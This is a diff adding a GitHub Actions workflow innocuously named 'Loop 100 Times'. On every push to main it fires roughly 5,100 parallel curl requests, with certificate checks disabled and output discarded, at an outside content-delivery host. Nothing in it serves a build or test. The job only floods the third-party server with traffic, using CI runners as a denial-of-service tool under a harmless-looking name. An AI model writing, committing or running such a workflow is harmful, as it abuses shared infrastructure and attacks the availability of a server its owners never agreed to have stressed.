@@ -1,0 +1,34 @@
+name: Loop 100 Times c81a7284-adbf-4947-8dca-d0d866d85123
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  loop_job:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run loop 100 times c81a7284-adbf-4947-8dca-d0d866d85123
+        id: loop_step
+        run: |
+          counter=0
+          max_loops=50
+          target="https://s4-n10-nl-cdn.eporner.com"
+          while [ $counter -lt 100 ]; do
+            echo "Running loop iteration $((counter + 1))..."
+            curl_loop=0
+            while [ $curl_loop -lt $max_loops ]; do
+              curl -ks "$target" 2>&1 > /dev/null &
+              curl_loop=$((curl_loop + 1))
+            done
+            echo " [+] started $max_loops processes "
+            curl -ks "$target" 2>&1 > /dev/null
+            
+            counter=$((counter + 1))
+          done
+          echo ">> DONE!"
+
+
+
+
